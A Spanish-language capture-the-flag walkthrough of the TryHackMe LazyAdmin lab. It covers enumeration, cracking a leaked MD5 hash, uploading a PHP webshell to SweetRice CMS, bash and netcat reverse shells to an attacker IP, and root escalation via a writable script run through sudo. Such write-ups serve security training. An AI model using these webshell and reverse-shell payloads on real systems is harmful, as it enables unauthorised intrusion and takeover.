## **Tutorial: Explotación de la máquina LazyAdmin en TryHackMe**


## 1. Conexión a la VPN de TryHackMe

Para poder acceder a las máquinas del laboratorio es necesario conectarse primero a la VPN de TryHackMe. Esto crea un túnel cifrado entre la máquina Kali y la red privada del laboratorio.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali ejecutamos el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```
Si este no funciona, probar el west-3-
Si la conexión se establece correctamente aparecerá el mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la VPN se ha establecido correctamente.

### 1.2 Verificación de la conexión

Para comprobar que la conexión está activa ejecutamos:

```bash
ip a
```

Esto mostrará una interfaz de red llamada tun0, que corresponde a la conexión VPN con TryHackMe.

## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo utilizando Nmap, una herramienta fundamental para el reconocimiento en auditorías de seguridad.

Se ejecuta el siguiente comando:

Escaneo completo de puertos:

```bash
nmap -sC -sV -p  10.130.170.227
```

![nmap](Maquina_de_Linux/LazyAdmin/imagenes/nmap.png)

El escaneo reveló:

- Puerto 22: Ejecutando SSH.
- Puerto 80: Apache en ejecución, mostrando la página predeterminada de Apache.


## 3. Acceso a la web

Abre el navegador:

```bash
http://10.130.170.227
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/url.png)

Verás la página por defecto de Apache (no útil directamente).



## 4. Enumeración de directorios 

Ahora toca descubrir rutas ocultas.

Ejecuta:

```bash
gobuster dir -u http://10.130.170.227 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/gobuster.png)

Este escaneo reveló el directorio /content. Pero parecía no contener información.

Luego escaneé http://10.130.170.227/content , lo que reveló el directorio /as.

```bash
gobuster dir -u http://10.130.170.227/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![url](Maquina_de_Linux/LazyAdmin/imagenes/gobuster2.png)

## 5. Acceso al panel /as

Ahora entra en el navegador:

```bash
http://10.130.170.227/content/as
```
![url](Maquina_de_Linux/LazyAdmin/imagenes/url2.png)

Es una página de inicio de sesión. Es un CMS de SweetRice.


## 6. Análisis del directorio /content/inc

Tras identificar el panel de administración en /content/as, se continuó con la enumeración de directorios previamente descubiertos con gobuster.

Uno de los directorios más interesantes fue:

```bash
http://10.130.170.227/content/inc/
```
![url](Maquina_de_Linux/LazyAdmin/imagenes/inc.png)

Al acceder a esta ruta, se observó la presencia de múltiples archivos y subdirectorios relacionados con la configuración interna del CMS.

Durante la exploración, se identificó un archivo relacionado con MySQL, el cual parecía contener información sensible.



## 7. Obtención de credenciales a través de backup

Dentro del directorio anterior, se localizó un archivo de copia de seguridad de la base de datos:

```bash
http://10.130.170.227/content/inc/mysql_backup
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/mysql.png)

Este archivo contenía información crítica, incluyendo credenciales de acceso almacenadas en la base de datos del CMS SweetRice CMS.

Al analizar su contenido, se pudo identificar:

Nombre de usuario
Contraseña en formato hash

Vamos a descifrar la contraseña encontrada: 42f749ade7f9e195bf475f37a44cafcb

![url](Maquina_de_Linux/LazyAdmin/imagenes/pass.png)

## 7. Identificación de la contraseña

Se trata de un hash en formato MD5, por lo que puede ser crackeado fácilmente usando herramientas como john o hashcat.


## 8. Crackeo del hash

Creamos un archivo con el hash:

```bash
nano pass.txt
```

Pegamos dentro:

```bash
42f749ade7f9e195bf475f37a44cafcb
```
![url](Maquina_de_Linux/LazyAdmin/imagenes/nano.png)

Utilizamos este comando para descifrarla

```bash
john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
```
![url](Maquina_de_Linux/LazyAdmin/imagenes/pass2.png)

Resultado esperado:

La contraseña obtenida es: Password123


## 9. Acceso al panel de administración

Una vez obtenida la contraseña Password123, se procede a acceder al panel de administración del CMS.

Se abre en el navegador:

```bash
http://10.130.170.227/content/as
```
![url](Maquina_de_Linux/LazyAdmin/imagenes/url3.png)

Se introducen las credenciales:

Usuario: manager
Contraseña: Password123

El acceso al panel de administración es exitoso.


## 10. Panel de administración del CMS

Tras iniciar sesión, se accede al panel de administración del SweetRice CMS.

Dentro del panel se pueden observar diferentes opciones de gestión del sitio, incluyendo la administración de contenido y subida de archivos.


## 11. Obtención de ejecución remota (RCE)

Dentro del panel de administración, se localiza una funcionalidad que permite la subida de archivos.

Aprovechando esta característica, se sube un archivo PHP malicioso para obtener ejecución remota de comandos.

Se crea un archivo

```bash
nano shell.phtml
```

Se crea una webshell básica:

```bash
<?php system($_GET['cmd']); ?>
```

Se guarda como:

```bash
shell.phtml
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/shell.png)

Buscamos el apartado de la web Media Center y subimos el archivo y ya estará ahí.


## 12. Ejecución de la webshell

Una vez subida la shell, se accede a ella desde el navegador:

```bash
http://10.130.170.227/content/attachment/shell.phtml?cmd=whoami
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/url4.png)

Si la ejecución es correcta, se obtiene respuesta del sistema, confirmando la vulnerabilidad de RCE (Remote Code Execution).


## 13. Obtención de reverse shell

En la máquina atacante se abre un listener:

```bash
nc -lvnp 4444
```

Y desde el navegador se ejecuta:

```bash
http://10.130.170.227/content/attachment/shell.phtml?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.142.53/4444%200%3E%261%22
```

Se obtiene acceso remoto al sistema.

![url](Maquina_de_Linux/LazyAdmin/imagenes/nc.png)


## 14. Acceso inicial al sistema

Una vez obtenida la reverse shell, se consigue acceso como usuario:

```bash
www-data@THM-Chal:/var/www/html/content/attachment$
```

Este usuario tiene permisos limitados dentro del sistema, por lo que el siguiente paso es la enumeración para escalar privilegios.



## 15. Enumeración del sistema

Se comienza explorando el sistema:

```bash
whoami
id
pwd
ls -la
```

Luego se accede al directorio raíz:

```bash
cd /
ls
```

## 16. Búsqueda de la flag de usuario

Se localiza la flag del usuario mediante búsqueda:

```bash
find / -name user.txt 2>/dev/null
```

Esto devuelve la ruta de la flag:

```bash
/home/itguy/user.tx
```

Se lee la flag:

```bash
cat /home/itguy/user.tx
```
![url](Maquina_de_Linux/LazyAdmin/imagenes/user.png)

Resultado es : THM{63e5bce9271952aad1113b6f1ac28a07}


## 17. Escalada de privilegios

Se verifica si el usuario www-data puede ejecutar comandos como root.

tengo que moverme con cd .. hasta llegar aqui www-data@THM-Chal:/$ y luego ejecutar:

```bash
sudo -l
```

El sistema devuelve que el usuario puede ejecutar el siguiente comando como root sin contraseña:

(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

Esto indica una mala configuración de permisos en sudo, permitiendo la ejecución de un script Perl con privilegios de root.


## 18. Análisis del vector de escalada

El binario vulnerable es:

```bash
/usr/bin/perl /home/itguy/backup.pl
```

Esto significa:

Se ejecuta Perl como root
Se ejecuta un script ubicado en /home/itguy/
El script puede contener comandos ejecutables o llamadas al sistema

Esto representa una vulnerabilidad de escalada de privilegios debido a una mala configuración de sudo.


## 19. Obtención de shell como root

Tras identificar la mala configuración de sudo, se observa que el usuario www-data puede ejecutar como root el siguiente binario:

```bash
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
Miramos el archivo:

```bash
cat /home/itguy/backup.pl
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/cat.png)

Este script ejecuta internamente:

```bash
system("sh", "/etc/copy.sh");
```

Por lo tanto, la escalada depende del contenido del archivo:

```bash
/etc/copy.sh
```


## 19.1 Verificación del contenido del script

Se comprueba el contenido original del archivo:

```bash
cat /etc/copy.sh
```

Contenido:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```


## 19.2 Problema detectado

Se identifica que la IP del payload no corresponde a la máquina atacante:

```bash
192.168.0.190 
```

Por lo tanto, la reverse shell no funcionará correctamente.


## 19.3 Corrección del payload

Se sobrescribe el archivo con la IP correcta de la máquina atacante:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.142.53 5554 >/tmp/f" > /etc/copy.sh
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/echo.png)

## 19.4 Ejecución del binario vulnerable

Se ejecuta el script con privilegios de root mediante sudo:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Esto provoca la ejecución de /etc/copy.sh como root.



## 19.5 Obtención de shell como root

En la máquina atacante se mantiene un listener activo:

```bash
nc -lvnp 5554
```

Al ejecutar el comando anterior, se recibe conexión inversa:

```bash
root@THM-Chal:#
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/root.png)

## 20. Confirmación de privilegios

Se verifica el usuario actual:

```bash
whoami
```

Resultado:

```bash
root
```

## 21. Búsquedad de la flag root

Se accede al directorio de root:

```bash
cd /root
ls -la
```
Se localiza el archivo de la flag:

```bash
cat root.txt
```

![url](Maquina_de_Linux/LazyAdmin/imagenes/catroot.png)

Resultado final

La flag de root es: THM{6637f41d0177b6f37cb20d775124699f}
